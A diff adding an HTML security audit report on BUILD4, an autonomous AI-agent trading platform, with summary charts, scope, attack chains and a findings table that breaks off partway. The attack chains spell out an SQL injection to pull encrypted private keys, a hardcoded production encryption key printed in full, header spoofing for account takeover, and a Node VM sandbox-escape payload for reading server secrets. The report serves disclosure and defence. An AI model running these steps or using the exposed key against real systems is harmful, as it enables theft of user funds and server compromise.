@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BUILD4 — Security Audit Report | Kairos Lab Security Research</title>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;800&family=DM+Sans:wght@400;500;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-primary: #0A0E17;
+  --bg-surface: #111827;
+  --bg-surface-hover: #1F2937;
+  --border: #1E293B;
+  --text-primary: #F1F5F9;
+  --text-secondary: #94A3B8;
+  --text-muted: #64748B;
+  --accent-cyan: #00D4FF;
+  --accent-purple: #7C3AED;
+  --accent-emerald: #059669;
+  --severity-critical: #EF4444;
+  --severity-high: #F97316;
+  --severity-medium: #EAB308;
+  --severity-low: #3B82F6;
+  --severity-info: #6B7280;
+  --font-heading: 'Bricolage Grotesque', sans-serif;
+  --font-body: 'DM Sans', sans-serif;
+  --font-mono: 'Space Mono', monospace;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: var(--bg-primary); color: var(--text-primary); font-family: var(--font-body); line-height: 1.7; }
+.container { max-width: 1100px; margin: 0 auto; padding: 0 32px; }
+h1, h2, h3, h4 { font-family: var(--font-heading); font-weight: 800; letter-spacing: -0.02em; }
+h2 { font-size: 28px; margin-bottom: 24px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+h3 { font-size: 20px; }
+h4 { font-size: 15px; color: var(--accent-cyan); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; font-weight: 600; }
+p { color: var(--text-secondary); margin-bottom: 12px; }
+a { color: var(--accent-cyan); text-decoration: none; }
+a:hover { text-decoration: underline; }
+.mono { font-family: var(--font-mono); font-size: 13px; }
+code { font-family: var(--font-mono); font-size: 13px; background: rgba(0,212,255,0.08); padding: 2px 6px; border-radius: 4px; }
+pre { background: #0D1117; border: 1px solid var(--border); border-radius: 8px; padding: 16px; overflow-x: auto; margin: 12px 0; }
+pre code { background: none; padding: 0; font-size: 12px; line-height: 1.6; color: #C9D1D9; }
+
+/* BADGES */
+.badge { padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; display: inline-block; }
+.badge.critical { background: rgba(239,68,68,0.15); color: #EF4444; border: 1px solid rgba(239,68,68,0.3); }
+.badge.high { background: rgba(249,115,22,0.15); color: #F97316; border: 1px solid rgba(249,115,22,0.3); }
+.badge.medium { background: rgba(234,179,8,0.15); color: #EAB308; border: 1px solid rgba(234,179,8,0.3); }
+.badge.low { background: rgba(59,130,246,0.15); color: #3B82F6; border: 1px solid rgba(59,130,246,0.3); }
+.badge.info { background: rgba(107,114,128,0.15); color: #6B7280; border: 1px solid rgba(107,114,128,0.3); }
+.status { font-weight: 700; font-size: 12px; }
+.status.open { color: #EF4444; }
+.status.fixed { color: #059669; }
+
+/* KAIROS LOGO — Hexagonal with K center + vertex dots */
+.kairos-logo-wrap { display: flex; flex-direction: column; align-items: center; margin-bottom: 48px; position: relative; }
+.kairos-hex-logo { position: relative; width: 140px; height: 140px; margin-bottom: 20px; }
+.kairos-hex-logo svg { width: 100%; height: 100%; }
+.kairos-brand-text { display: flex; flex-direction: column; align-items: center; }
+.kairos-brand-text .brand-main { font-family: var(--font-heading); font-size: 26px; font-weight: 800; letter-spacing: 0.18em; color: var(--text-primary); text-transform: uppercase; }
+.kairos-brand-text .brand-sub { font-family: var(--font-body); font-size: 13px; font-weight: 500; letter-spacing: 0.12em; color: var(--text-muted); text-transform: uppercase; margin-top: 2px; }
+
+/* COVER */
+.cover-page { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 60px 32px; position: relative; overflow: hidden; }
+.cover-page::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse at 30% 50%, rgba(0,212,255,0.06) 0%, transparent 60%), radial-gradient(ellipse at 70% 60%, rgba(124,58,237,0.04) 0%, transparent 50%); pointer-events: none; }
+.cover-title { font-size: 56px; font-weight: 800; margin-bottom: 12px; background: linear-gradient(135deg, var(--text-primary), var(--accent-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; position: relative; }
+.cover-subtitle { font-size: 22px; color: var(--text-secondary); margin-bottom: 48px; font-weight: 400; position: relative; }
+.cover-meta { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px 32px; display: grid; grid-template-columns: 1fr 1fr; gap: 16px; max-width: 500px; position: relative; }
+.meta-row { display: flex; justify-content: space-between; gap: 16px; }
+.meta-row .label { color: var(--text-muted); font-size: 13px; text-transform: uppercase; letter-spacing: 0.05em; }
+.meta-row span:last-child { color: var(--text-primary); font-weight: 500; font-size: 14px; }
+.cover-rating { margin-top: 32px; padding: 16px 32px; border-radius: 8px; font-size: 18px; font-weight: 800; letter-spacing: 0.05em; position: relative; }
+.cover-rating.critical-rating { background: rgba(239,68,68,0.15); color: #EF4444; border: 2px solid rgba(239,68,68,0.4); }
+
+/* SECTIONS */
+section { padding: 60px 0; }
+.section-divider { width: 60px; height: 3px; background: linear-gradient(90deg, var(--accent-cyan), var(--accent-purple)); margin-bottom: 24px; border-radius: 2px; }
+
+/* SEVERITY CHART */
+.chart-container { display: flex; align-items: center; gap: 48px; margin: 32px 0; flex-wrap: wrap; justify-content: center; }
+.severity-bars { flex: 1; min-width: 300px; }
+.sev-bar { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+.sev-bar .sev-label { width: 80px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; text-align: right; }
+.sev-bar .bar-track { flex: 1; height: 28px; background: var(--bg-surface); border-radius: 6px; overflow: hidden; position: relative; }
+.sev-bar .bar-fill { height: 100%; border-radius: 6px; display: flex; align-items: center; justify-content: flex-end; padding-right: 10px; font-size: 13px; font-weight: 700; transition: width 1s ease; }
+.sev-bar .bar-fill.critical { background: linear-gradient(90deg, rgba(239,68,68,0.3), rgba(239,68,68,0.7)); color: #EF4444; }
+.sev-bar .bar-fill.high { background: linear-gradient(90deg, rgba(249,115,22,0.3), rgba(249,115,22,0.7)); color: #F97316; }
+.sev-bar .bar-fill.medium { background: linear-gradient(90deg, rgba(234,179,8,0.3), rgba(234,179,8,0.7)); color: #EAB308; }
+.sev-bar .bar-fill.low { background: linear-gradient(90deg, rgba(59,130,246,0.3), rgba(59,130,246,0.7)); color: #3B82F6; }
+.sev-bar .bar-fill.info-bar { background: linear-gradient(90deg, rgba(107,114,128,0.3), rgba(107,114,128,0.7)); color: #6B7280; }
+.total-findings { text-align: center; min-width: 160px; }
+.total-number { font-size: 72px; font-weight: 800; font-family: var(--font-heading); background: linear-gradient(135deg, var(--severity-critical), var(--severity-high)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+.total-label { font-size: 14px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.1em; }
+
+/* FINDINGS TABLE */
+.findings-table { width: 100%; border-collapse: collapse; margin: 24px 0; }
+.findings-table th { text-align: left; padding: 12px 16px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); border-bottom: 2px solid var(--border); font-family: var(--font-heading); }
+.findings-table td { padding: 10px 16px; border-bottom: 1px solid var(--border); font-size: 14px; vertical-align: middle; }
+.findings-table tr:hover { background: var(--bg-surface-hover); }
+.findings-table .finding-id-cell { font-family: var(--font-mono); font-size: 12px; white-space: nowrap; color: var(--accent-cyan); }
+
+/* FINDING DETAIL CARD */
+.finding { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 12px; padding: 32px; margin-bottom: 24px; transition: border-color 0.2s; }
+.finding:hover { border-color: rgba(0,212,255,0.2); }
+.finding.sev-critical { border-left: 4px solid var(--severity-critical); }
+.finding.sev-high { border-left: 4px solid var(--severity-high); }
+.finding.sev-medium { border-left: 4px solid var(--severity-medium); }
+.finding.sev-low { border-left: 4px solid var(--severity-low); }
+.finding-header { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; cursor: pointer; flex-wrap: wrap; }
+.finding-id { font-family: var(--font-mono); font-size: 13px; color: var(--accent-cyan); flex-shrink: 0; }
+.finding-title { font-size: 18px; flex: 1; min-width: 200px; }
+.finding-meta { display: flex; gap: 24px; margin-bottom: 20px; padding: 12px 16px; background: rgba(0,0,0,0.3); border-radius: 8px; flex-wrap: wrap; }
+.finding-meta .meta-item { display: flex; flex-direction: column; gap: 2px; }
+.finding-meta .meta-item .label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); }
+.finding-meta .meta-item span:last-child { font-size: 13px; color: var(--text-primary); }
+.finding-section { margin-bottom: 16px; }
+.finding-section h4 { margin-bottom: 8px; }
+.finding-section ol { padding-left: 20px; color: var(--text-secondary); }
+.finding-section ol li { margin-bottom: 6px; }
+.finding.collapsed .finding-section, .finding.collapsed .finding-meta { display: none; }
+
+/* KILL CHAIN */
+.kill-chain { background: rgba(239,68,68,0.05); border: 1px solid rgba(239,68,68,0.2); border-radius: 12px; padding: 24px; margin: 24px 0; }
+.kill-chain h4 { color: var(--severity-critical); }
+.kill-chain-steps { display: flex; gap: 0; align-items: center; flex-wrap: wrap; margin-top: 16px; }
+.kc-step { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-size: 13px; flex: 1; min-width: 180px; }
+.kc-step .step-num { font-size: 10px; color: var(--severity-critical); font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; }
+.kc-arrow { color: var(--severity-critical); font-size: 20px; padding: 0 8px; flex-shrink: 0; }
+
+/* ROADMAP */
+.roadmap-phase { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px; margin-bottom: 16px; }
+.roadmap-phase h4 { margin-bottom: 12px; }
+.roadmap-phase ul { padding-left: 20px; color: var(--text-secondary); }
+.roadmap-phase ul li { margin-bottom: 6px; font-size: 14px; }
+.phase-critical { border-left: 4px solid var(--severity-critical); }
+.phase-high { border-left: 4px solid var(--severity-high); }
+.phase-medium { border-left: 4px solid var(--severity-medium); }
+.phase-low { border-left: 4px solid var(--severity-low); }
+
+/* DOMAIN BREAKDOWN */
+.domain-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin: 24px 0; }
+.domain-card { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; }
+.domain-card .domain-name { font-size: 13px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+.domain-card .domain-count { font-size: 36px; font-weight: 800; font-family: var(--font-heading); color: var(--text-primary); }
+.domain-card .domain-crits { font-size: 12px; color: var(--severity-critical); margin-top: 4px; }
+
+/* FOOTER */
+.report-footer { text-align: center; padding: 40px 0; border-top: 1px solid var(--border); margin-top: 60px; }
+.report-footer p { font-size: 12px; color: var(--text-muted); }
+
+/* NAV */
+.nav-bar { position: fixed; top: 0; left: 0; right: 0; background: rgba(10,14,23,0.9); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); z-index: 100; padding: 12px 32px; display: flex; align-items: center; justify-content: space-between; }
+.nav-brand { display: flex; align-items: center; gap: 8px; }
+.nav-brand svg { flex-shrink: 0; }
+.nav-links { display: flex; gap: 20px; }
+.nav-links a { font-size: 13px; color: var(--text-muted); transition: color 0.2s; }
+.nav-links a:hover { color: var(--accent-cyan); text-decoration: none; }
+
+/* PRINT */
+@media print {
+  .nav-bar { display: none; }
+  body { background: white; color: #1a1a2e; }
+  .cover-page { min-height: auto; padding: 40px; page-break-after: always; }
+  .finding { page-break-inside: avoid; background: #f8f9fa; border-color: #ddd; }
+  .badge.critical { background: #fee; color: #c00; }
+  pre { background: #f4f4f4; border-color: #ddd; }
+  code { color: #333; }
+  h2, h4, .finding-id, a { color: #0066cc !important; -webkit-text-fill-color: #0066cc !important; }
+  .cover-title { -webkit-text-fill-color: #1a1a2e !important; }
+  p, .findings-table td, ol li { color: #333 !important; }
+}
+
+@media (max-width: 768px) {
+  .cover-title { font-size: 36px; }
+  .chart-container { flex-direction: column; }
+  .finding-header { flex-direction: column; align-items: flex-start; }
+  .finding-meta { flex-direction: column; }
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav-bar">
+  <div class="nav-brand">
+    <svg width="28" height="28" viewBox="0 0 140 140"><polygon points="70,8 128,38 128,102 70,132 12,102 12,38" fill="none" stroke="rgba(200,210,220,0.25)" stroke-width="2.5"/><circle cx="70" cy="70" r="18" fill="rgba(200,210,220,0.1)"/><text x="70" y="76" text-anchor="middle" font-family="'Bricolage Grotesque',sans-serif" font-size="22" font-weight="800" fill="#F1F5F9">K</text></svg>
+    <span style="font-family:var(--font-heading);font-weight:800;font-size:16px;letter-spacing:0.12em;">KAIROS LAB</span>
+  </div>
+  <div class="nav-links">
+    <a href="#executive-summary">Summary</a>
+    <a href="#scope">Scope</a>
+    <a href="#kill-chains">Kill Chains</a>
+    <a href="#findings-table">Findings</a>
+    <a href="#findings-detail">Details</a>
+    <a href="#roadmap">Roadmap</a>
+  </div>
+</nav>
+
+<!-- COVER -->
+<section class="cover-page">
+  <div class="kairos-logo-wrap">
+    <div class="kairos-hex-logo">
+      <svg viewBox="0 0 140 140" xmlns="http://www.w3.org/2000/svg">
+        <!-- Hexagon outline -->
+        <polygon points="70,8 128,38 128,102 70,132 12,102 12,38" fill="none" stroke="rgba(200,210,220,0.22)" stroke-width="2.5"/>
+        <!-- Inner lines to center -->
+        <line x1="70" y1="8" x2="70" y2="70" stroke="rgba(200,210,220,0.10)" stroke-width="1.5"/>
+        <line x1="128" y1="38" x2="70" y2="70" stroke="rgba(200,210,220,0.10)" stroke-width="1.5"/>
+        <line x1="128" y1="102" x2="70" y2="70" stroke="rgba(200,210,220,0.10)" stroke-width="1.5"/>
+        <line x1="70" y1="132" x2="70" y2="70" stroke="rgba(200,210,220,0.10)" stroke-width="1.5"/>
+        <line x1="12" y1="102" x2="70" y2="70" stroke="rgba(200,210,220,0.10)" stroke-width="1.5"/>
+        <line x1="12" y1="38" x2="70" y2="70" stroke="rgba(200,210,220,0.10)" stroke-width="1.5"/>
+        <!-- Center circle with K -->
+        <circle cx="70" cy="70" r="22" fill="rgba(200,210,220,0.08)"/>
+        <text x="70" y="78" text-anchor="middle" font-family="'Bricolage Grotesque',sans-serif" font-size="28" font-weight="800" fill="#1a2332">K</text>
+        <!-- Vertex dots (matching screenshot colors) -->
+        <circle cx="70" cy="8" r="8" fill="#9B7FE6"/><!-- top - purple -->
+        <circle cx="128" cy="38" r="8" fill="#00D4CC"/><!-- top-right - cyan -->
+        <circle cx="128" cy="102" r="8" fill="#4A90D9"/><!-- bottom-right - blue -->
+        <circle cx="70" cy="132" r="8" fill="#B4A7D6"/><!-- bottom - light purple -->
+        <circle cx="12" cy="102" r="8" fill="#7DD4E8"/><!-- bottom-left - light cyan -->
+        <circle cx="12" cy="38" r="8" fill="#A8C8E8"/><!-- top-left - light blue -->
+      </svg>
+    </div>
+    <div class="kairos-brand-text">
+      <span class="brand-main">KAIROS LAB</span>
+      <span class="brand-sub">Security Research</span>
+    </div>
+  </div>
+  <h1 class="cover-title">BUILD4</h1>
+  <h2 class="cover-subtitle">Security Audit Report &mdash; Autonomous AI Agent Economy</h2>
+  <div class="cover-meta">
+    <div class="meta-row"><span class="label">Target</span><span>build4.io + @BUILD4_BOT</span></div>
+    <div class="meta-row"><span class="label">Chain</span><span>BNB Smart Chain (56)</span></div>
+    <div class="meta-row"><span class="label">Audit Date</span><span>April 6, 2026</span></div>
+    <div class="meta-row"><span class="label">Commit</span><span class="mono">HEAD (Beehavedev/build4)</span></div>
+    <div class="meta-row"><span class="label">Version</span><span>1.0</span></div>
+    <div class="meta-row"><span class="label">Classification</span><span style="color:var(--severity-critical)">CONFIDENTIAL</span></div>
+  </div>
+  <div class="cover-rating critical-rating" style="margin-top:32px;">OVERALL RISK: CRITICAL</div>
+</section>
+
+<!-- EXECUTIVE SUMMARY -->
+<section id="executive-summary" class="container">
+  <div class="section-divider"></div>
+  <h2>Executive Summary</h2>
+  <p style="font-size:16px; color:var(--text-primary); line-height:1.8; margin-bottom:24px;">
+    Kairos Lab Security Research conducted a comprehensive security audit of <strong>BUILD4</strong>, a decentralized infrastructure platform for autonomous AI agents on BNB Chain. The audit covered <strong>6 deployed smart contracts</strong>, a <strong>Node.js/Express backend</strong>, a <strong>Telegram bot</strong> (868KB of code), <strong>trading and token launch systems</strong>, and <strong>Twitter/social agents</strong>.
+  </p>
+  <p style="font-size:16px; color:var(--severity-critical); font-weight:700; margin-bottom:24px;">
+    The platform is NOT safe for production deployment. We identified multiple critical vulnerabilities that allow an attacker to steal all user funds, execute arbitrary code on the server, and take over any user account without authentication.
+  </p>
+  <p style="color:var(--text-primary);">Key findings include:</p>
+  <ul style="color:var(--text-secondary); padding-left:20px; margin-bottom:24px;">
+    <li><strong style="color:var(--severity-critical)">Hardcoded encryption key</strong> protecting all user private keys &mdash; published in open-source repo</li>
+    <li><strong style="color:var(--severity-critical)">SQL injection</strong> enabling mass private key exfiltration</li>
+    <li><strong style="color:var(--severity-critical)">Zero authentication</strong> on MiniApp API &mdash; header spoofing gives full account access</li>
+    <li><strong style="color:var(--severity-critical)">Node.js VM sandbox escape</strong> &mdash; skill execution leads to remote code execution</li>
+    <li><strong style="color:var(--severity-critical)">Private keys sent in Telegram messages</strong> in plaintext</li>
+    <li><strong style="color:var(--severity-high)">Prompt injection</strong> across all AI agents (Telegram, Twitter, Builder)</li>
+    <li><strong style="color:var(--severity-high)">15-25% slippage tolerance</strong> enabling guaranteed sandwich attacks on every trade</li>
+    <li><strong style="color:var(--severity-high)">Complete centralization</strong> of all smart contracts under single EOA</li>
+  </ul>
+
+  <!-- SEVERITY CHART -->
+  <div class="chart-container">
+    <div class="severity-bars">
+      <div class="sev-bar"><span class="sev-label" style="color:var(--severity-critical)">Critical</span><div class="bar-track"><div class="bar-fill critical" style="width:38%">14</div></div></div>
+      <div class="sev-bar"><span class="sev-label" style="color:var(--severity-high)">High</span><div class="bar-track"><div class="bar-fill high" style="width:93%">35</div></div></div>
+      <div class="sev-bar"><span class="sev-label" style="color:var(--severity-medium)">Medium</span><div class="bar-track"><div class="bar-fill medium" style="width:100%">43</div></div></div>
+      <div class="sev-bar"><span class="sev-label" style="color:var(--severity-low)">Low</span><div class="bar-track"><div class="bar-fill low" style="width:81%">30</div></div></div>
+      <div class="sev-bar"><span class="sev-label" style="color:var(--severity-info)">Info</span><div class="bar-track"><div class="bar-fill info-bar" style="width:14%">5</div></div></div>
+    </div>
+    <div class="total-findings">
+      <div class="total-number">127</div>
+      <div class="total-label">Total Findings</div>
+      <div style="font-size:11px;color:var(--text-muted);margin-top:4px;">Validated by SENTINEL</div>
+    </div>
+  </div>
+
+  <!-- DOMAIN BREAKDOWN -->
+  <div class="domain-grid">
+    <div class="domain-card"><div class="domain-name">Smart Contracts</div><div class="domain-count">20</div><div class="domain-crits">1 Critical</div></div>
+    <div class="domain-card"><div class="domain-name">Backend / API</div><div class="domain-count">24</div><div class="domain-crits">5 Critical</div></div>
+    <div class="domain-card"><div class="domain-name">Telegram Bot</div><div class="domain-count">24</div><div class="domain-crits">3 Critical</div></div>
+    <div class="domain-card"><div class="domain-name">Trading / Token</div><div class="domain-count">22</div><div class="domain-crits">5 Critical</div></div>
+    <div class="domain-card"><div class="domain-name">Twitter / Outreach</div><div class="domain-count">15</div><div class="domain-crits">0 Critical</div></div>
+    <div class="domain-card"><div class="domain-name">Client / Config</div><div class="domain-count">12</div><div class="domain-crits">1 Critical</div></div>
+    <div class="domain-card"><div class="domain-name">SENTINEL Validation</div><div class="domain-count">10</div><div class="domain-crits">2 Confirmed</div></div>
+  </div>
+</section>
+
+<!-- SCOPE -->
+<section id="scope" class="container">
+  <div class="section-divider"></div>
+  <h2>Scope &amp; Methodology</h2>
+  <div style="display:grid; grid-template-columns:1fr 1fr; gap:32px;">
+    <div>
+      <h4>Targets Audited</h4>
+      <ul style="color:var(--text-secondary); padding-left:20px;">
+        <li>Smart Contracts: <code>BUILD4Staking</code>, <code>AgentEconomyHub</code>, <code>SkillMarketplace</code>, <code>AgentReplication</code>, <code>ConstitutionRegistry</code></li>
+        <li>Backend: Express 5, PostgreSQL (Drizzle ORM), 51 TypeScript server files</li>
+        <li>Telegram Bot: <code>telegram-bot.ts</code> (868KB, ~20K lines)</li>
+        <li>Trading: <code>trading-agent.ts</code>, <code>token-launcher.ts</code>, <code>stealth-buy.ts</code></li>
+        <li>AI Inference: Hyperbolic, AkashML, Ritual providers</li>
+        <li>Social: Twitter agents, outreach system, bounty engine</li>
+      </ul>
+    </div>
+    <div>
+      <h4>Methodology</h4>
+      <ul style="color:var(--text-secondary); padding-left:20px;">
+        <li>Manual code review of 100% of server-side code</li>
+        <li>Smart contract analysis (Solidity 0.8.24)</li>
+        <li>OWASP Top 10 / OWASP Web3 testing</li>
+        <li>Prompt injection and LLM abuse testing</li>
+        <li>Authentication and authorization review</li>
+        <li>Cryptographic implementation review</li>
+        <li>Business logic and financial flow analysis</li>
+      </ul>
+      <h4 style="margin-top:20px;">Stack</h4>
+      <p><code>TypeScript 96.8%</code> <code>Solidity 1.3%</code> <code>ethers.js v6</code> <code>node-telegram-bot-api</code> <code>OpenZeppelin 5.4</code></p>
+    </div>
+  </div>
+</section>
+
+<!-- KILL CHAINS -->
+<section id="kill-chains" class="container">
+  <div class="section-divider"></div>
+  <h2>Critical Attack Chains</h2>
+  <p>These are the most dangerous attack paths identified, combining multiple vulnerabilities for maximum impact.</p>
+
+  <div class="kill-chain">
+    <h4>Kill Chain #1 &mdash; Mass Private Key Exfiltration &amp; Total Fund Drain</h4>
+    <p style="color:var(--severity-critical); font-weight:600;">Impact: Loss of ALL user funds. Estimated risk: Total Value Locked.</p>
+    <div class="kill-chain-steps">
+      <div class="kc-step"><div class="step-num">Step 1</div>SQL injection via <code>/api/quests/complete</code> &mdash; wallet param with <code>sql.raw()</code></div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 2</div>UNION SELECT <code>encrypted_private_key</code> from <code>telegram_wallets</code> table</div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 3</div>Decrypt with hardcoded key: <code>"build4-beehave-prod-stable-encryption-key-2026"</code></div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 4</div>Drain all wallets via <code>ethers.js</code> transfers</div>
+    </div>
+  </div>
+
+  <div class="kill-chain">
+    <h4>Kill Chain #2 &mdash; Zero-Auth Account Takeover</h4>
+    <p style="color:var(--severity-critical); font-weight:600;">Impact: Full control of any user's account, wallet, and trades.</p>
+    <div class="kill-chain-steps">
+      <div class="kc-step"><div class="step-num">Step 1</div>Spoof HTTP header <code>x-telegram-chat-id: VICTIM_ID</code></div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 2</div>GET <code>/api/miniapp/account</code> &rarr; view victim's wallet &amp; balances</div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 3</div>POST <code>/api/miniapp/import-wallet</code> &rarr; inject attacker's wallet</div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 4</div>Execute trades from victim's Aster account</div>
+    </div>
+  </div>
+
+  <div class="kill-chain">
+    <h4>Kill Chain #3 &mdash; Remote Code Execution via Skill Injection</h4>
+    <p style="color:var(--severity-critical); font-weight:600;">Impact: Full server compromise, access to all env vars, DB, and keys.</p>
+    <div class="kill-chain-steps">
+      <div class="kc-step"><div class="step-num">Step 1</div>Create malicious skill via Telegram bot or agent</div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 2</div>Bypass regex validation (Unicode tricks, prototype chain)</div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 3</div>VM escape: <code>this.constructor.constructor('return process')()</code></div>
+      <span class="kc-arrow">&rarr;</span>
+      <div class="kc-step"><div class="step-num">Step 4</div>Read <code>process.env</code> &rarr; all API keys, DB credentials, private keys</div>
+    </div>
+  </div>
+</section>
+
+<!-- FINDINGS SUMMARY TABLE -->
+<section id="findings-table" class="container">
+  <div class="section-divider"></div>
+  <h2>Findings Summary</h2>
+  <p>Top 30 findings by severity. Click any finding ID to jump to details.</p>
+  <table class="findings-table">
+    <thead><tr><th>ID</th><th>Title</th><th>Domain</th><th>Severity</th><th>Status</th></tr></thead>
+    <tbody>
+      <!-- CRITICAL -->
+      <tr><td class="finding-id-cell"><a href="#C01">KSR-B4-C01</a></td><td>Hardcoded Encryption Key for All User Private Keys</td><td>Backend</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C02">KSR-B4-C02</a></td><td>SQL Injection via sql.raw() in Quest Completion</td><td>Backend</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C03">KSR-B4-C03</a></td><td>Zero Authentication on MiniApp API (Header Spoofing)</td><td>Backend</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C04">KSR-B4-C04</a></td><td>Node.js VM Sandbox Escape &rarr; RCE via Skill Execution</td><td>Backend</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C05">KSR-B4-C05</a></td><td>Private Keys Sent in Telegram Messages (Plaintext)</td><td>Telegram</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C06">KSR-B4-C06</a></td><td>Private Keys Cached in Global Memory Map (No TTL)</td><td>Telegram</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C07">KSR-B4-C07</a></td><td>Stealth Buy System Has No Authorization</td><td>Trading</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C08">KSR-B4-C08</a></td><td>Plaintext Private Key Caching in Trading Agent</td><td>Trading</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C09">KSR-B4-C09</a></td><td>ERC20 Transfer Return Value Ignored (BUILD4Staking)</td><td>Smart Contract</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C10">KSR-B4-C10</a></td><td>Unlimited Token Approvals in DeFi Operations</td><td>Trading</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C11">KSR-B4-C11</a></td><td>Private Key Fallback Returns Plaintext on Format Error</td><td>Backend</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C12">KSR-B4-C12</a></td><td>Deployer Private Key Hardcoded in .replit Config</td><td>Config</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#C13">KSR-B4-C13</a></td><td>WALLET_ENCRYPTION_KEY Missing from Production Deploy</td><td>Deploy</td><td><span class="badge critical">CRITICAL</span></td><td><span class="status open">Open</span></td></tr>
+      <!-- HIGH (top 15) -->
+      <tr><td class="finding-id-cell"><a href="#H01">KSR-B4-H01</a></td><td>Prompt Injection Across All AI Agents</td><td>AI/LLM</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H02">KSR-B4-H02</a></td><td>15-25% Slippage Enables Guaranteed Sandwich Attacks</td><td>Trading</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H03">KSR-B4-H03</a></td><td>HMAC Signature Truncated to 64 Bits (Wallet Linking)</td><td>Telegram</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H04">KSR-B4-H04</a></td><td>Callback Data Manipulation &rarr; Unauthorized Trades</td><td>Telegram</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H05">KSR-B4-H05</a></td><td>SSRF via Outreach URL Fetching (Internal Network Access)</td><td>Outreach</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H06">KSR-B4-H06</a></td><td>Twitter API Credentials Stored in Plaintext in Database</td><td>Twitter</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H07">KSR-B4-H07</a></td><td>creditAgent Creates Unbacked Virtual Balances (Insolvency)</td><td>Smart Contract</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H08">KSR-B4-H08</a></td><td>Reward Rate Overwrite Orphans Undistributed Tokens</td><td>Smart Contract</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
